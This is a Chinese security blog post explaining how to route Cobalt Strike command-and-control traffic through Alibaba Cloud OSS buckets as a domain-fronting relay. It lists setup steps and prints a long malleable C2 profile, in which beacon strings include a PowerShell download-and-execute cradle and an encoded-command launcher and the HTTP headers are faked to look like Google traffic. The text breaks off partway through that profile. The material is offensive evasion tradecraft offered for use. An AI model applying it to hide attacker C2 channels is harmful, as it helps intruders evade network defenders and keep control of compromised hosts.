---
title: 对抗小技巧：利用阿里云OSS做域前置
url: https://mp.weixin.qq.com/s?__biz=Mzg5ODE3NTU1OQ==&mid=2247484353&idx=1&sn=b79772c4e36dbb08b09eb8b6405672fe&chksm=c067c4e9f7104dff388d304028afa98ea9627adb21282cdb9909ee16f700628212b0ac985e56&scene=58&subscene=0#rd
source: Medi0cr1ty
date: 2024-05-11
fetch_date: 2025-10-06T17:17:59.293616
---

# 对抗小技巧：利用阿里云OSS做域前置

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ZiaGB6iaicqkWjgbg479IFE8vG4BofZT148EvEwFYknDB2RSth057vY75rmnzkdt28AzzEtickGxYKoIVxF7caeH8A/0?wx_fmt=jpeg)

# 对抗小技巧：利用阿里云OSS做域前置

原创

duckbubi

Medi0cr1ty

**01**

**简要说明**

和以往的cdn/云函数做域前置相似，利用oss做前置的只是拓展玩法。

利用到的功能特性：OSS是支持回源到自定义地址的，套在c2前面就可以完成域前置操作。

**02**

**配置方法**

1.注册bucket并通过镜像回源功能将流量指向c2服务

![](https://mmbiz.qpic.cn/mmbiz_png/ZiaGB6iaicqkWjgbg479IFE8vG4BofZT148nJId4s0pR54MYmRUHGa7az2OcgPmzOpIAibia4pyibfJDTyXhNdIne9vw/640?wx_fmt=png&from=appmsg)

2.开启bucket公共读权限（方便c2profile中写请求随机文件的情况）

3.创建aksk每秒删除一次bucket中的文件(避免回源一次oss将文件缓存到bucket中导致不再回源至c2)

4.修改c2profile中http-post中相关配置，改为通过GET发请求,参考如下 (因为oss不支持POST方法，也没法回源到c2 server)

```
# default sleep time is 60sset sleeptime "60000";
# jitter factor 0-99% [randomize callback times]set jitter    "0";
# indicate that this is the default Beacon profileset sample_name "Cobalt Strike Beacon (Default)";
# this is the default profile. Make sure we look like Cobalt Strike's Beacon payload. (that's what we are, right?)stage {  set stomppe "false";  set name    "beacon.dll";
  string "%d.%s";  string "post";  string "%s%s";  string "cdn.%x%x.%s";  string "www6.%x%x.%s";  string "%s.1%x.%x%x.%s";  string "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s";  string "%s.3%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s";  string "%s.2%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s";  string "%s.2%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x.%x%x.%s";  string "%s.2%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x.%x%x.%s";  string "%s.1%08x%08x%08x%08x%08x%08x%08x.%x%x.%s";  string "%s.1%08x%08x%08x%08x%08x%08x.%x%x.%s";  string "%s.1%08x%08x%08x%08x%08x.%x%x.%s";  string "%s.1%08x%08x%08x%08x.%x%x.%s";  string "%s.1%08x%08x%08x.%x%x.%s";  string "%s.1%08x%08x.%x%x.%s";  string "%s.1%08x.%x%x.%s";  string "api.%x%x.%s";  string "unknown";  string "could not run command (w/ token) because of its length of %d bytes!";  string "could not spawn %s (token): %d";  string "could not spawn %s: %d";  string "Could not open process token: %d (%u)";  string "could not run %s as %s\\%s: %d";  string "COMSPEC";  string " /C ";  string "could not upload file: %d";  string "could not open %s: %d";  string "could not get file time: %d";  string "could not set file time: %d";  string "127.0.0.1";  string "Could not connect to pipe (%s): %d";  string "Could not open service control manager on %s: %d";  string "Could not create service %s on %s: %d";  string "Could not start service %s on %s: %d";  string "Start servicesservices %s on %s";  string "Could not query service %s on %s: %d";  string "Could not delete service %s on %s: %d";  string "SeDebugPrivilege";  string "SeTcbPrivilege";  string "SeCreateTokenPrivilege";  string "SeAssignPrimaryTokenPrivilege";  string "SeLockMemoryPrivilege";  string "SeIncreaseQuotaPrivilege";  string "SeUnsolicitedInputPrivilege";  string "SeMachineAccountPrivilege";  string "SeSecurityPrivilege";  string "SeTakeOwnershipPrivilege";  string "SeLoadDriverPrivilege";  string "SeSystemProfilePrivilege";  string "SeSystemtimePrivilege";  string "SeProfileSingleProcessPrivilege";  string "SeIncreaseBasePriorityPrivilege";  string "SeCreatePagefilePrivilege";  string "SeCreatePermanentPrivilege";  string "SeBackupPrivilege";  string "SeRestorePrivilege";  string "SeShutdownPrivilege";  string "SeAuditPrivilege";  string "SeSystemEnvironmentPrivilege";  string "SeChangeNotifyPrivilege";  string "SeRemoteShutdownPrivilege";  string "SeUndockPrivilege";  string "SeSyncAgentPrivilege";  string "SeEnableDelegationPrivilege";  string "SeManageVolumePrivilege";  string "Could not create service: %d";  string "Could not start service: %d";  string "Failed to impersonate token: %d";  string "Failed to get token";  string "IsWow64Process";  string "kernel32";  string "Could not open '%s'";  string "%s\\%s";  string "copy failed: %d";  string "move failed: %d";  string "D  0  %02d-%02d-%02d %02d.%02d.%02d  %s";  string "F  %I64d  %02d-%02d-%02d %02d.%02d.%02d  %s";  string "Wow64DisableWow64FsRedirection";  string "Wow64RevertWow64FsRedirection";  string "ppid %d is in a different desktop session (spawned jobs may fail). Use 'ppid' to reset.";  string "could not allocate %d bytes in process: %d";  string "could not write to process memory: %d";  string "could not adjust permissions in process: %d";  string "could not create remote thread in %d: %d";  string "could not open process %d: %d";  string "%d is an x64 process (can't inject x86 content)";  string "%d is an x86 process (can't inject x64 content)";  string "syswow64";  string "system32";  string "Could not set PPID to %d: %d";  string "Could not set PPID to %d";  string "ntdll";  string "NtQueueApcThread";  string "%ld  ";  string "%.2X";  string "%.2X:";  string "process";  string "Could not connect to pipe: %d";  string "%d  %d  %s";  string "Kerberos";  string "kerberos ticket purge failed: %08x";  string "kerberos ticket use failed: %08x";  string "could not connect to pipe: %d";  string "could not connect to pipe";  string "Maximum links reached. Disconnect one";  string "%d  %d  %d.%d  %s  %s  %s  %d  %d";  string "Could not bind to %d";  string "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/')";  string "%%IMPORT%%";  string "Command length (%d) too long";  string "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s";  string "powershell -nop -exec bypass -EncodedCommand \"%s\"";  string "?%s=%s";  string "%s and %s = %s";  string "%s%s: %s";  string "%s&%s";  string "%s%s";  string "Could not kill %d: %d";  string "%s  %d  %d";  string "%s  %d  %d  %s  %s  %d";  string "%s\\*";  string "sha256";  string "abcdefghijklmnop";  string "sprng";  string "could not create pipe: %d";  string "I'm already in SMB mode";  string "%s {admin}";  string "Could not open process: %d (%u)";  string "Failed to impersonate token from %d (%u)";  string "Failed to duplicate primary token for %d (%u)";  string "Failed to impersonate logged on user %d (%u)";  string "Could not create token: %d";  string "HTTP/1.1 200 OK";  string "Content-Type: application/octet-stream";  string "Content-Length: %d";  string "Microsoft Base Cryptographic Provider v1.0";}
# define indicators for an HTTP GEThttp-get {
  set uri "/wiki/doc";
  client {    metadata {      base64url;      prepend "SESSIONID=";      header "Cookie";    }  }
  server {    header "Server" "nginx/1.10.3 (Ubuntu)";        header "Content-Type" "application/octet-stream";          header "Connection" "keep-alive";          header "Vary" "Accept";          header "Pragma" "public";      header "Cache-Control" "no-cache";          header "Expires" "0";          header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";
    output {      mask;      netbios;      prepend "data=";      append "%%";      print;    }  }}
http-post {  set uri "/wiki/IMXo";  set verb "GET";  client {
        header "Sec-Ch-Ua" "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\"";        header "Sec-Ch-Ua-Mobile" "?0";        header "Sec-Ch-Ua-Platfrom" "Windows";        header "Accept" "*/*";        header "Origin" "Google";        header "Sec-Fetch-Site" "same-origin";        header "Sec-Fetch-Mode" "no-cors";        header "Sec-Fetch-Dest" "empty";        header "Referer" "https://www.google.com";        header "Accept-Language" "en-US,en;q=0.9";
        output {            base64url;            header "X-Client-Data";

        }
        id {            base64url;            parameter "ei";        }    }
  server {
        header "Content-Type" "text/html; charset=UTF-8";        header "Bfcache-Opt-In" "unload";        header "Server" "gws";        header "X-Xss-Protection" "0";        header "X-Frame-Origins" "SAMEORIGIN";        header "Alt-Svc" "h3=\":443\"; ma=2592000,h3-29=\":443\"...